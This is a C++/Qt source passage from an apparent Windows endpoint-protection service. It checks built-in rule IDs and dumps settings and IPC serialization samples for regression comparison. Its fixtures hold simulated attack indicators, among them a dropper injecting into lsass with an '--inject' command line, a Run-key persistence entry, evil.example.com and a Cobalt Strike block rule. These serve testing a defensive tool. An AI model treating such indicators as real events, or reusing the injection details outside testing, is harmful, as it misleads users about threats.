        for (const QString &m : msgs)
            out() << m << "\n";
    }
    return failed;
}

// ======================= 内置规则集不变量检查 =======================
//
// 为什么这是一条独立且必须常驻的检查:
//
// RuleEngine::loadRules 把规则装进 QHash<QUuid, DefenseRule>,即【以 id 为键】。
// 因此两条内置规则若 id 相同,后装的会把先装的直接顶掉 —— 规则被静默丢弃,
// 对应的检测能力凭空消失,而且没有任何报错。
//
// DefaultRules::build() 末尾按规则内容派生 UUIDv5(见那里的注释),以换取跨重启稳定的
// 规则身份;代价就是引入了撞 id 的可能。这条检查把代价钉住:一旦有人新增内置规则时
// 复用了已有备注 / 匹配条件组合,构建立刻失败,而不是等到线上少了一条防护才发现。
int checkRuleset()
{
    const QVector<DefenseRule> rules = DefaultRules::build();
    QHash<QUuid, QStringList> byId;
    for (const DefenseRule &r : rules)
        byId[r.id].append(r.note);

    int dup = 0;
    for (auto it = byId.constBegin(); it != byId.constEnd(); ++it) {
        if (it.value().size() <= 1)
            continue;
        ++dup;
        out() << "DUPLICATE ID  " << it.key().toString(QUuid::WithoutBraces) << "\n";
        for (const QString &n : it.value())
            out() << "      " << n << "\n";
    }

    out() << "内置规则 " << rules.size() << " 条,唯一 id " << byId.size() << " 个";
    if (dup == 0) {
        out() << "  OK\n";
    } else {
        out() << "  发现 " << dup << " 组撞 id —— 这些规则会在 loadRules 时被静默丢弃\n";
    }
    out().flush();
    return dup == 0 ? 0 : 1;
}

// 把内置规则集原样导出为 JSON。
//
// 用途:588 条内置规则的离线审阅与跨版本 diff。规则表在源码 diff 里是一片 fw(...) / proc(...)
// 调用,漏掉一个 hardOverride、写错一个通配符看不出来;导出成结构化字段之后,这类
// 【静默的检测缺口】(不报错、只表现为某类攻击不再被拦)才有被看出来的可能。
//
// 顺序即 build() 的顺序,不排序、不去重 —— 顺序本身要能被回比。
int dumpRules(const QString &path)
{
    const QVector<DefenseRule> rules = DefaultRules::build();
    QJsonArray arr;
    for (const DefenseRule &r : rules)
        arr.append(r.toJson());
    QJsonObject root;
    root[QStringLiteral("count")] = arr.size();
    root[QStringLiteral("rules")] = arr;
    if (!writeJson(path, root))
        return 1;
    out() << "已导出内置规则: " << path << "  " << arr.size() << " 条\n";
    out().flush();
    return 0;
}

// 导出 Phase 4 新增的两个模型(RuntimeSettings / VtScanRecord)的线格式样本。
//
// 用途与 --dump-rules 同理:这两个类型的 JSON 就是 settings.json / vt_scan_history.json
// 的落盘格式。改了字段名或类型,新版服务就读不懂旧文件(升级即丢配置),反过来也一样。
// 改动前后各导一份对比,是确认线格式没被动到的最省事办法。
//
// 三个样本各有针对:
//   defaults   全默认值 —— 覆盖"每个字段的默认值是否一致"这一最容易抄错的点;
//   filled     每个字段都给非默认值 —— 覆盖字段名拼写与类型(尤其 int64 的额度预算);
//   sparse     只写少数键 —— 覆盖 fromJson「缺失键保留默认、字符串仅在键存在时覆盖」
//              这条语义(它决定用户手改过的配置文件会不会被抹掉一半)。
int dumpModels(const QString &path)
{
    QJsonObject root;

    root[QStringLiteral("settingsDefaults")] = RuntimeSettings{}.toJson();

    {
        RuntimeSettings s;
        s.protectionEnabled = false;
        s.processProtection = false;
        s.fileProtection = false;
        s.registryProtection = false;
        s.selfProtection = false;
        s.networkProtection = false;
        s.memoryProtectionEnabled = false;
        s.memoryProtectionVtVerifyEnabled = false;
        s.trustSignedActors = false;
        s.defaultBlock = true;
        s.silentMode = true;
        s.promptTimeoutSeconds = 45;
        s.virusTotalEnabled = true;
        s.malwareBazaarEnabled = true;
        s.otxEnabled = true;
        s.threatBookEnabled = true;
        s.threatBookNetworkIntelEnabled = true;
        s.metaDefenderEnabled = true;
        s.hybridAnalysisEnabled = true;
        s.virusTotalApiKey = QStringLiteral("vt-key");
        s.malwareBazaarApiKey = QStringLiteral("mb-key");
        s.otxApiKey = QStringLiteral("otx-key");
        s.threatBookApiKey = QStringLiteral("tb-key");
        s.metaDefenderApiKey = QStringLiteral("md-key");
        s.hybridAnalysisApiKey = QStringLiteral("ha-key");
        s.aiScanDoubleClickEnabled = false;
        s.aiScanSuspendDuringScan = false;
        s.aiScanBlockOnFailure = true;
        s.cloudBehaviorUploadEnabled = true; // 默认 false,这里翻成 true 以覆盖往返序列化
        s.aiBaseUrl = QStringLiteral("https://ai.example.com/v1");
        s.aiApiKey = QStringLiteral("ai-key");
        s.aiModel = QStringLiteral("some-model");
        s.aiScanScriptTextLimitKb = 24;
        s.aiScanBinarySampleLimitMb = 8;
        s.aiScanMaxStrings = 240;
        s.kernelDriverEnabled = true;
        s.userModeBehaviorMonitor = false;
        s.ransomwareCanaryEnabled = false;
        s.behaviorBaselineEnabled = false;
        s.aiGrayZoneConsultEnabled = true;
        s.aiCreditGuardEnabled = false;
        // 刻意超过 2^32,钉住它必须走 int64 而不是 int。
        s.aiMonthlyCreditBudget = 9007199254740991LL;
        s.eventSource = QStringLiteral("Driver");
        s.kernelConnected = true;
        s.kernelStatus = QString::fromUtf8("\xe5\xb7\xb2\xe8\xbf\x9e\xe6\x8e\xa5"); // "已连接"
        s.quarantineOnBlock = true;
        root[QStringLiteral("settingsFilled")] = s.toJson();
    }

    {
        // 只写少数键(含一个字符串键与一个整数键),其余缺失。
        QJsonObject sparse;
        sparse[QStringLiteral("protectionEnabled")] = false;
        sparse[QStringLiteral("promptTimeoutSeconds")] = 5;
        sparse[QStringLiteral("eventSource")] = QStringLiteral("Driver");
        root[QStringLiteral("settingsSparseInput")] = sparse;
        root[QStringLiteral("settingsSparseParsed")] = RuntimeSettings::fromJson(sparse).toJson();
    }

    {
        QJsonArray recs;
        VtScanRecord a;
        a.id = stableId(QStringLiteral("vt-rec-a"));
        a.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        a.filePath = QStringLiteral("C:\\Users\\u\\Downloads\\sample.exe");
        a.fileName = QStringLiteral("sample.exe");
        a.stage = VtScanStage::Completed;
        a.percent = 100;
        a.outcome = VtScanOutcome::Malicious;
        a.malicious = 41;
        a.totalEngines = 72;
        a.threatLabel = QStringLiteral("trojan.zbot/agent");
        a.message = QString::fromUtf8("\xe5\xa4\x9a\xe5\xbc\x95\xe6\x93\x8e\xe5\x91\xbd\xe4\xb8\xad"); // "多引擎命中"
        a.uploaded = true;
        a.source = QString::fromUtf8("\xe5\x8f\x8c\xe5\x87\xbb"); // "双击"
        a.timestampUtc = fixedNow();
        recs.append(a.toJson());

        VtScanRecord b;
        b.id = stableId(QStringLiteral("vt-rec-b"));
        b.stage = VtScanStage::Queued;
        b.outcome = VtScanOutcome::Pending;
        b.timestampUtc = fixedNow().addSecs(-3600);
        recs.append(b.toJson());

        root[QStringLiteral("vtRecords")] = recs;
    }

    if (!writeJson(path, root))
        return 1;
    out() << "已导出模型样本: " << path << "\n";
    out().flush();
    return 0;
}

// 导出 Phase 7 的 IPC 线格式样本。
//
// 这一份比前面几份更要紧,原因是线格式有【两个独立的端】:服务端(cpp/service 的 IpcServer)
// 与 Qt UI 客户端(cpp/ui 的 IpcClient)。只改其中一端的序列化,另一端就静默读不到新字段,
// 表现为界面上某块数据凭空变空,而不是报错。所以"字段对上"不够,要求逐字节一致。
//
// 两部分:
//   envelopes  信封的 serialize() 原文 —— 同时钉住双重编码(payload 是被转义的
//              JSON 文本)与键序。
//   payloads   每个 payload 的 toJson()。拿它反过来喂 fromJson 再重新序列化并比对,
//              「fromJson 漏读某字段」也会被抓到(漏读的字段会变回默认值)。
//
// 每个 payload 尽量给两到三个变体,把【条件输出】的两条分支都走到:
// 有/无 optional、空/非空列表、空/非空字符串。只测一条分支等于没测条件。
//
// 所有 requestId 与时间戳都显式赋值:C++ 侧这些成员的默认初值是 QUuid::createUuid() 与
// QDateTime::currentDateTimeUtc(),前者随机、后者随真实时钟,直接 dump 出来的文件
// 每次都不同,没法进版本库。
int dumpIpc(const QString &path)
{
    using namespace bulwark::ipc;
    QJsonObject root;
    root[QStringLiteral("schema")] = kSchema;
    root[QStringLiteral("fixedNow")] = QString::fromLatin1(kFixedNowIso);
    root[QStringLiteral("pipeName")] = controlPipe();

    const QDateTime t0 = fixedNow();

    // ---------------- 信封 ----------------
    QJsonArray envelopes;
    const auto addEnvelope = [&envelopes](const QString &note, const IpcMessage &m) {
        QJsonObject e;
        e[QStringLiteral("note")] = note;
        e[QStringLiteral("type")] = static_cast<int>(m.type);
        e[QStringLiteral("payload")] = m.payload;
        e[QStringLiteral("wire")] = m.serialize();
        envelopes.append(e);
    };
    {
        HelloPayload h;
        h.processId = 4242;
        h.role = QStringLiteral("ui");
        addEnvelope(QStringLiteral("Hello:典型的对象负载(双重编码)"),
                    IpcMessage::create(IpcMessageType::Hello, h.toJson()));
    }
    // 纯文本负载:payload 不是 JSON。信封仍是 JSON,故文本要被正常转义。
    addEnvelope(QStringLiteral("LogEntry:纯文本负载"),
                IpcMessage::createRaw(IpcMessageType::LogEntry,
                                      QString::fromUtf8("已放行 C:\\Temp\\a b\\x.exe")));
    // 需要转义的字符全上:引号、反斜杠、换行、制表、控制字符、非 ASCII。
    addEnvelope(QStringLiteral("LogEntry:含需转义字符与非 ASCII"),
                IpcMessage::createRaw(IpcMessageType::LogEntry,
                                      QString::fromUtf8("引号\" 反斜杠\\ 换行\n 制表\t "
                                                        "控制\x01 中文测试 emoji\xF0\x9F\x94\x92")));
    addEnvelope(QStringLiteral("空负载"),
                IpcMessage::createRaw(IpcMessageType::EventHistoryClearRequest, QString()));
    {
        // 最大的消息号,确认序号本身能原样往返。
        ProcessActionResultPayload r;
        r.requestId = stableId(QStringLiteral("ipc-env-procact"));
        r.kind = ProcessActionKind::ComputeHash;
        r.pid = 1234;
        r.success = true;
        r.message = QString::fromUtf8("已计算哈希");
        r.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        addEnvelope(QStringLiteral("ProcessActionResponse:最大消息号 57"),
                    IpcMessage::create(IpcMessageType::ProcessActionResponse, r.toJson()));
    }
    root[QStringLiteral("envelopes")] = envelopes;

    // ---------------- payload ----------------
    QJsonObject p;

    // Hello:默认(role 有默认值 "ui")与填满。
    p[QStringLiteral("helloDefaults")] = HelloPayload{}.toJson();
    {
        HelloPayload h;
        h.processId = 31337;
        h.role = QString::fromUtf8("服务");
        p[QStringLiteral("helloFilled")] = h.toJson();
    }
    // role 键【缺失】时 fromJson 要回落 "ui";role 为空串时要保留空串。这两条是两回事。
    {
        QJsonObject noRole;
        noRole[QStringLiteral("processId")] = 7;
        p[QStringLiteral("helloNoRoleInput")] = noRole;
        p[QStringLiteral("helloNoRoleParsed")] = HelloPayload::fromJson(noRole).toJson();
        QJsonObject emptyRole;
        emptyRole[QStringLiteral("processId")] = 8;
        emptyRole[QStringLiteral("role")] = QString();
        p[QStringLiteral("helloEmptyRoleInput")] = emptyRole;
        p[QStringLiteral("helloEmptyRoleParsed")] = HelloPayload::fromJson(emptyRole).toJson();
    }

    p[QStringLiteral("promptResponseDefaults")] = PromptResponsePayload{}.toJson();
    {
        PromptResponsePayload pr;
        pr.eventId = stableId(QStringLiteral("ipc-prompt"));
        pr.action = VerdictAction::Block;
        pr.remember = true;
        pr.scope = RememberScope::OneDay;
        p[QStringLiteral("promptResponseFilled")] = pr.toJson();
    }

    // ---- EventLogPayload:内嵌完整 SecurityEvent ----
    p[QStringLiteral("eventLogDefaults")] = EventLogPayload{}.toJson();
    {
        bulwark::SecurityEvent e;
        e.id = stableId(QStringLiteral("ipc-evt"));
        e.timestampUtc = t0;
        e.type = EventType::RemoteThread;
        e.actorPid = 2468;
        e.actorPath = QStringLiteral("C:\\Users\\v\\AppData\\Local\\Temp\\dropper.exe");
        e.actorHash = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        e.actorSigned = false;
        e.signatureMismatch = true;
        e.actorFileSize = 1234567LL;
        e.actorPublisher = QString::fromUtf8("某公司(测试)");
        e.actorCertThumbprint = QStringLiteral("DEADBEEF");
        e.certNotAfterUtc = t0.addDays(30);
        e.signingTimeUtc = t0.addDays(-5);
        e.certRevoked = true;
        e.signedAfterCertExpiry = false;
        e.isFirstSeen = true;
        e.originatorPid = 999;
        e.originatorPath = QStringLiteral("C:\\Windows\\System32\\svchost.exe");
        e.parentPid = 1000;
        e.parentPath = QStringLiteral("C:\\Windows\\explorer.exe");
        e.originKind = ProcessOriginKind::Service;
        e.originService = QStringLiteral("Schedule");
        e.originServiceDisplay = QStringLiteral("Task Scheduler");
        e.originDetail = QString::fromUtf8("由服务控制管理器派生");
        e.commandLine = QStringLiteral("\"dropper.exe\" --inject 4242");
        e.target = QStringLiteral("C:\\Windows\\System32\\lsass.exe");
        e.detail = QString::fromUtf8("远程线程入口位于未映射内存");
        e.riskScore = 87;
        e.hasThreatIndicator = true;
        e.matchedRuleNote = QString::fromUtf8("[内置] 远程线程注入 lsass");
        e.userModeObserved = false;
        e.kernelBlocked = true;
        e.memoryInjection = true;
        e.fileDescription = QStringLiteral("Test Dropper");
        e.techniques << QStringLiteral("T1055") << QStringLiteral("T1003.001");
        e.addEvidence(QStringLiteral("InjectionAnalyzer"), EvidenceKind::HardIndicator,
                      QString::fromUtf8("向 lsass 创建远程线程"), 60);
        {
            bulwark::FileReputation rep;
            rep.sha256 = e.actorHash;
            rep.verdict = ReputationVerdict::Malicious;
            rep.malicious = 41;
            rep.totalEngines = 72;
            rep.threatLabel = QStringLiteral("trojan.zbot/agent");
            rep.source = QStringLiteral("VirusTotal");
            rep.fetchedUtc = t0;
            rep.lastAnalysisUtc = t0.addSecs(-86400);
            rep.querySucceeded = true;
            e.reputation = rep;
        }
        {
            bulwark::ChainEventInfo c;
            c.timestampUtc = t0.addSecs(-30);
            c.type = EventType::ProcessCreate;
            c.actorPid = 1000;
            c.parentPid = 900;
            c.actorPath = QStringLiteral("C:\\Windows\\explorer.exe");
            c.commandLine = QStringLiteral("explorer.exe");
            c.target = e.actorPath;
            c.riskScore = 10;
            c.originKind = ProcessOriginKind::Interactive;
            c.originLabel = QString::fromUtf8("交互式启动");
            e.chainContext.append(c);
        }

        EventLogPayload el;
        el.event = e;
        el.action = VerdictAction::Block;
        el.source = VerdictSource::Heuristic;
        el.enforcement = bulwark::EnforcementOutcome::KernelBlocked;
        p[QStringLiteral("eventLogFilled")] = el.toJson();

        EventHistoryResponsePayload hist;
        hist.events << el << EventLogPayload{};
        p[QStringLiteral("eventHistoryFilled")] = hist.toJson();
        p[QStringLiteral("eventHistoryEmpty")] = EventHistoryResponsePayload{}.toJson();

        TimelineResponsePayload tr;
        tr.requestId = stableId(QStringLiteral("ipc-timeline-res"));
        tr.events << el;
        tr.scanned = 4096;
        tr.matched = 300;
        tr.truncated = true;
        tr.earliestUtc = t0.addDays(-14);
        tr.message = QString::fromUtf8("已截断到 limit");
        p[QStringLiteral("timelineResponseFilled")] = tr.toJson();
    }
    // earliestUtc 无效 -> 整个键不出现。这是本 payload 唯一的条件输出。
    p[QStringLiteral("timelineResponseDefaults")] = TimelineResponsePayload{}.toJson();

    // ---- 残留项 / 规则管理 ----
    p[QStringLiteral("skippedDefaults")] = RemediationSkippedItem{}.toJson();
    {
        RemediationSkippedItem s;
        s.target = QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
        s.reason = QString::fromUtf8("文件被占用,无法隔离");
        s.isFile = true;
        p[QStringLiteral("skippedFilled")] = s.toJson();
    }
    {
        // 规则列表:空与非空。规则本体的往返已由 test_models 覆盖,这里只钉外层键名。
        p[QStringLiteral("rulesResponseEmpty")] = RulesResponsePayload{}.toJson();
        RulesResponsePayload rr;
        bulwark::DefenseRule r;
        r.id = stableId(QStringLiteral("ipc-rule"));
        r.actorPath = QStringLiteral("C:\\Temp\\evil.exe");
        r.type = EventType::NetworkConnect;
        r.targetPattern = QStringLiteral("1.2.3.4*");
        r.action = VerdictAction::Block;
        r.hardOverride = true;
        r.note = QString::fromUtf8("[情报-ThreatFox] Cobalt Strike (100%)");
        r.createdUtc = t0;
        r.expiresUtc = t0.addDays(7);
        r.actorHashes << QStringLiteral("AA11BB22CC33DD44EE55FF6600778899AABBCCDDEEFF00112233445566778899");
        rr.rules << r;
        p[QStringLiteral("rulesResponseFilled")] = rr.toJson();

        TrustListResponsePayload tl;
        tl.entries << r;
        p[QStringLiteral("trustListFilled")] = tl.toJson();
        p[QStringLiteral("trustListEmpty")] = TrustListResponsePayload{}.toJson();

        IntelApplyRequestPayload ia;
        ia.requestId = stableId(QStringLiteral("ipc-intel-apply"));
        ia.rules << r;
        p[QStringLiteral("intelApplyFilled")] = ia.toJson();

        IntelRefreshResultPayload irr;
        irr.requestId = stableId(QStringLiteral("ipc-intel-res"));
        irr.success = true;
        irr.iocCount = 1234;
        irr.rulesApplied = 42;
        irr.generatedRules << r;
        irr.threatContext << QString::fromUtf8("家族:Cobalt Strike") << QStringLiteral("botnet_cc");
        irr.message = QString::fromUtf8("已生成 42 条规则");
        p[QStringLiteral("intelRefreshResultFilled")] = irr.toJson();
        p[QStringLiteral("intelRefreshResultDefaults")] = IntelRefreshResultPayload{}.toJson();
    }
    {
        DeleteRulePayload d;
        d.ruleId = stableId(QStringLiteral("ipc-del-rule"));
        p[QStringLiteral("deleteRuleFilled")] = d.toJson();
        // 全零 GUID 序列化为【空串】,不是 "00000000-...":这是 guidToString 的特例。
        p[QStringLiteral("deleteRuleDefaults")] = DeleteRulePayload{}.toJson();
        RemoveTrustPayload rt;
        rt.ruleId = d.ruleId;
        p[QStringLiteral("removeTrustFilled")] = rt.toJson();
    }
    // AddRule 的 type 是 optional:有值写数字、无值写 null(不是省略键)。
    p[QStringLiteral("addRuleNoType")] = AddRulePayload{}.toJson();
    {
        AddRulePayload ar;
        ar.actorPath = QStringLiteral("C:\\Program Files\\App\\app.exe");
        ar.type = EventType::FileWrite;
        ar.targetPattern = QString::fromUtf8("C:\\用户数据\\*");
        ar.action = VerdictAction::Ask;
        p[QStringLiteral("addRuleWithType")] = ar.toJson();
    }
    p[QStringLiteral("addTrustDefaults")] = AddTrustPayload{}.toJson();
    {
        AddTrustPayload at;
        at.actorPath = QStringLiteral("D:\\Dev\\build");
        at.note = QString::fromUtf8("开发目录,整目录放行");
        at.isDirectory = true;
        p[QStringLiteral("addTrustDirectory")] = at.toJson();
    }

    // ---- VirusTotal ----
    {
        VtRequestPayload vq;
        vq.requestId = QUuid{}; // 默认是随机 UUID,显式清零才可复现
        p[QStringLiteral("vtRequestDefaults")] = vq.toJson();
        vq.requestId = stableId(QStringLiteral("ipc-vt-req"));
        vq.kind = bulwark::VtRequestKind::QueryFile;
        vq.filePath = QStringLiteral("C:\\Users\\v\\Downloads\\sample.exe");
        vq.source = QString::fromUtf8("双击");
        p[QStringLiteral("vtRequestFilled")] = vq.toJson();
    }
    {
        // 两个 optional 都空 -> 都写 null。
        p[QStringLiteral("vtResponseDefaults")] = VtResponsePayload{}.toJson();
        VtResponsePayload vr;
        vr.requestId = stableId(QStringLiteral("ipc-vt-res"));
        vr.success = true;
        vr.message = QString::fromUtf8("查询成功");
        bulwark::FileReputation rep;
        rep.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        rep.verdict = ReputationVerdict::Suspicious;
        rep.malicious = 3;
        rep.totalEngines = 70;
        rep.threatLabel = QStringLiteral("heuristic.suspicious");
        rep.source = QStringLiteral("Proxy:VirusTotal");
        rep.fetchedUtc = t0;
        rep.querySucceeded = true;
        vr.reputation = rep;
        QList<bulwark::ReputationUsage> us;
        bulwark::ReputationUsage u1;
        u1.source = QStringLiteral("VirusTotal");
        u1.enabled = true;
        u1.usedToday = 17;
        u1.dailyLimit = 500;
        u1.perMinuteLimit = 4;
        bulwark::ReputationUsage u2;
        u2.source = QStringLiteral("ThreatBook");
        us << u1 << u2;
        vr.usages = us;
        p[QStringLiteral("vtResponseFilled")] = vr.toJson();
        // 空数组的 usages 与 null 的 usages 是两回事,分别钉住。
        VtResponsePayload vr2;
        vr2.requestId = vr.requestId;
        vr2.usages = QList<bulwark::ReputationUsage>{};
        p[QStringLiteral("vtResponseEmptyUsages")] = vr2.toJson();
    }
    {
        p[QStringLiteral("vtHistoryEmpty")] = VtHistoryResponsePayload{}.toJson();
        VtHistoryResponsePayload vh;
        bulwark::VtScanRecord a;
        a.id = stableId(QStringLiteral("ipc-vt-rec"));
        a.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        a.filePath = QStringLiteral("C:\\Users\\v\\Downloads\\sample.exe");
        a.fileName = QStringLiteral("sample.exe");
        a.stage = VtScanStage::Completed;
        a.percent = 100;
        a.outcome = VtScanOutcome::Malicious;
        a.malicious = 41;
        a.totalEngines = 72;
        a.threatLabel = QStringLiteral("trojan.zbot/agent");
        a.message = QString::fromUtf8("多引擎命中");
        a.uploaded = true;
        a.source = QString::fromUtf8("双击");
        a.timestampUtc = t0;
        vh.records << a;
        p[QStringLiteral("vtHistoryFilled")] = vh.toJson();
    }
    {
        p[QStringLiteral("vtDetailDefaults")] = VtDetailResponsePayload{}.toJson();
        VtDetailResponsePayload vd;
        vd.requestId = stableId(QStringLiteral("ipc-vt-detail"));
        vd.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        vd.success = true;
        vd.message = QString::fromUtf8("已收录");
        vd.typeDescription = QStringLiteral("Win32 EXE");
        vd.sizeBytes = 987654321LL;
        vd.firstSubmissionUtc = t0.addDays(-400);
        vd.lastAnalysisUtc = t0.addSecs(-3600);
        vd.timesSubmitted = 12;
        vd.reputation = -37; // 社区信誉分可负 —— 钉住它不是无符号
        vd.malicious = 41;
        vd.totalEngines = 72;
        vd.threatLabel = QStringLiteral("trojan.zbot/agent");
        vd.knownNames << QStringLiteral("sample.exe") << QString::fromUtf8("发票.exe");
        vd.tags << QStringLiteral("peexe") << QStringLiteral("packed");
        vd.maliciousDetections << QStringLiteral("ClamAV: Win.Trojan.Zbot")
                               << QStringLiteral("ESET-NOD32: a variant of Win32/Kryptik");
        vd.suspiciousDetections << QStringLiteral("Foo: heuristic");
        vd.droppedFiles << QStringLiteral("payload.dll");
        vd.registryKeys << QStringLiteral("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Evil");
        vd.contactedIps << QStringLiteral("1.2.3.4:443");
        vd.contactedDomains << QStringLiteral("evil.example.com");
        p[QStringLiteral("vtDetailFilled")] = vd.toJson();
    }

    // ---- 隔离区 ----
    p[QStringLiteral("quarantineItemDefaults")] = QuarantineItemPayload{}.toJson();
    {
        QuarantineItemPayload qi;
        qi.id = stableId(QStringLiteral("ipc-quar-item"));
        qi.originalPath = QStringLiteral("C:\\Users\\v\\Downloads\\evil.exe");
        qi.fileName = QStringLiteral("evil.exe");
        qi.quarantinedUtc = t0;
        qi.size = 4294967296LL; // > 2^32,钉住它走 int64
        qi.sha256 = QStringLiteral("aa11bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899");
        qi.reason = QString::fromUtf8("云查杀确认恶意");
        qi.actorPid = 4242;
        p[QStringLiteral("quarantineItemFilled")] = qi.toJson();

        QuarantineListResponsePayload ql;
        ql.items << qi << QuarantineItemPayload{};
        p[QStringLiteral("quarantineListFilled")] = ql.toJson();
        p[QStringLiteral("quarantineListEmpty")] = QuarantineListResponsePayload{}.toJson();

        QuarantineActionPayload qa;
        qa.id = qi.id;
        p[QStringLiteral("quarantineActionFilled")] = qa.toJson();

        QuarantineActionResultPayload qar;
        qar.id = qi.id;
        qar.success = false;
        qar.message = QString::fromUtf8("原路径已存在同名文件,还原失败");
        p[QStringLiteral("quarantineActionResultFilled")] = qar.toJson();
        p[QStringLiteral("quarantineActionResultDefaults")] = QuarantineActionResultPayload{}.toJson();
    }
    {
        ManualQuarantinePayload mq;
        mq.requestId = QUuid{};
        p[QStringLiteral("manualQuarantineDefaults")] = mq.toJson();
        mq.requestId = stableId(QStringLiteral("ipc-manual-quar"));
        mq.path = QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
        p[QStringLiteral("manualQuarantineFilled")] = mq.toJson();

        ManualQuarantineResultPayload mr;
        mr.requestId = mq.requestId;
        mr.success = true;
        mr.message = QString::fromUtf8("已隔离");
        p[QStringLiteral("manualQuarantineResultFilled")] = mr.toJson();
        p[QStringLiteral("manualQuarantineResultDefaults")] = ManualQuarantineResultPayload{}.toJson();
    }

    // ---- 持久化审计 ----
    {
        // signed 三态:true / false / null(未采集)。null 表示"没查过"而不是"未签名"。
        bulwark::PersistenceEntry e1;
        e1.id = QStringLiteral("run-evil");
        e1.category = bulwark::PersistenceCategory::RegistryRun;
        e1.name = QStringLiteral("Evil");
        e1.location = QStringLiteral("HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run");
        e1.command = QStringLiteral("\"C:\\ProgramData\\evil\\payload.exe\" -s");
        e1.imagePath = QStringLiteral("C:\\ProgramData\\evil\\payload.exe");
        e1.isSigned = false;
        e1.publisher = QString();
        e1.riskScore = 65;
        e1.riskReasons << QString::fromUtf8("未签名") << QString::fromUtf8("位于用户可写目录");
        e1.techniques << QStringLiteral("T1547.001");
        p[QStringLiteral("persistenceEntrySignedFalse")] = e1.toJson();
        e1.isSigned = true;
        e1.publisher = QStringLiteral("Contoso Ltd.");
        p[QStringLiteral("persistenceEntrySignedTrue")] = e1.toJson();
        e1.isSigned.reset();
        p[QStringLiteral("persistenceEntrySignedNull")] = e1.toJson();
        p[QStringLiteral("persistenceEntryDefaults")] = bulwark::PersistenceEntry{}.toJson();

        PersistenceListResponsePayload pl;
        pl.scannedUtc = t0; // 默认是 currentDateTimeUtc(),必须显式给
        pl.entries << e1;
        pl.message = QString::fromUtf8("共 1 项");
        p[QStringLiteral("persistenceListFilled")] = pl.toJson();
        PersistenceListResponsePayload plEmpty;
        plEmpty.scannedUtc = t0;
        p[QStringLiteral("persistenceListEmpty")] = plEmpty.toJson();

        PersistenceCleanupRequestPayload pcq;
        pcq.requestId = stableId(QStringLiteral("ipc-persist-clean"));
        pcq.entry = e1;
        p[QStringLiteral("persistenceCleanupRequestFilled")] = pcq.toJson();

        PersistenceCleanupResultPayload pcr;
        pcr.requestId = pcq.requestId;
        pcr.success = true;
        pcr.entryId = e1.id;
        pcr.message = QString::fromUtf8("已移除注册表值并隔离载荷");
        pcr.quarantinedFiles << QStringLiteral("C:\\ProgramData\\evil\\payload.exe");
        pcr.removedRegistryValues << QStringLiteral("HKCU\\...\\Run\\Evil");
        RemediationSkippedItem sk;
        sk.target = QStringLiteral("C:\\ProgramData\\evil\\locked.dll");
        sk.reason = QString::fromUtf8("文件被占用");
        sk.isFile = true;
        pcr.skipped << sk;
        p[QStringLiteral("persistenceCleanupResultFilled")] = pcr.toJson();
        p[QStringLiteral("persistenceCleanupResultDefaults")] = PersistenceCleanupResultPayload{}.toJson();
    }

    // ---- AI 研判 ----
    p[QStringLiteral("aiScanDefaults")] = AiScanResponsePayload{}.toJson();
    {
        AiScanResponsePayload ai;
        ai.eventId = stableId(QStringLiteral("ipc-ai"));
        ai.available = true;
        ai.recommendation = VerdictAction::Block;
        ai.summary = QString::fromUtf8("样本含加壳与反调试特征,且外联可疑域名");
        ai.confidence = QString::fromUtf8("高");
        p[QStringLiteral("aiScanFilled")] = ai.toJson();
    }

    // ---- 足迹清理报告 ----
    {
        RemediationReportPayload rr;
        rr.timestampUtc = t0; // 默认是 currentDateTimeUtc(),必须显式给
        rr.actorPath = QStringLiteral("C:\\Users\\v\\AppData\\Local\\Temp\\dropper.exe");
        rr.actorPid = 2468;
        rr.reason = QString::fromUtf8("云查杀确认恶意(41/72)");
        rr.actorQuarantined = true;
        rr.quarantinedFiles << QStringLiteral("C:\\ProgramData\\evil\\payload.dll");
        rr.removedRegistryValues << QStringLiteral("HKCU\\...\\Run\\Evil");
        RemediationSkippedItem sk;
        sk.target = QStringLiteral("HKLM\\SYSTEM\\...\\Services\\EvilSvc");
        sk.reason = QString::fromUtf8("需要更高权限");
        sk.isFile = false;
        rr.skipped << sk;
        rr.intelSource = QStringLiteral("VirusTotal, HybridAnalysis");
        rr.intelDroppedFiles << QStringLiteral("payload.dll") << QStringLiteral("b.dat");
        rr.intelDroppedFilePaths << QStringLiteral("C:\\Users\\x\\AppData\\Local\\Temp\\payload.dll");
        rr.intelDroppedFileHashes << QStringLiteral("bb22cc33dd44ee55ff6600778899aabbccddeeff00112233445566778899aa11");
        rr.intelRegistryKeys << QStringLiteral("HKCU\\Software\\Evil");
        rr.intelContactedIps << QStringLiteral("1.2.3.4:443");
        rr.intelContactedDomains << QStringLiteral("evil.example.com");
        rr.intelServices << QStringLiteral("EvilSvc");
        rr.intelProcessNames << QStringLiteral("cmd.exe");
        rr.intelMutexes << QStringLiteral("Global\\EvilMutex");
        rr.intelRulesInjected = 7;
        p[QStringLiteral("remediationReportFilled")] = rr.toJson();
        RemediationReportPayload rrEmpty;
        rrEmpty.timestampUtc = t0;
        p[QStringLiteral("remediationReportEmpty")] = rrEmpty.toJson();
    }

    // ---- 情报刷新请求 ----
    {
        IntelRefreshRequestPayload ir;
        ir.requestId = QUuid{};
        p[QStringLiteral("intelRefreshRequestDefaults")] = ir.toJson();
        ir.requestId = stableId(QStringLiteral("ipc-intel-req"));
        ir.previewOnly = true;
        p[QStringLiteral("intelRefreshRequestFilled")] = ir.toJson();
    }

    // ---- 时间线请求:四个条件输出的两条分支都要走 ----
    {
        TimelineRequestPayload tq;
        tq.requestId = QUuid{};
        p[QStringLiteral("timelineRequestDefaults")] = tq.toJson();
        tq.requestId = stableId(QStringLiteral("ipc-timeline-req"));
        tq.fromUtc = t0.addDays(-7);
        tq.toUtc = t0;
        tq.types << static_cast<int>(EventType::ProcessCreate)
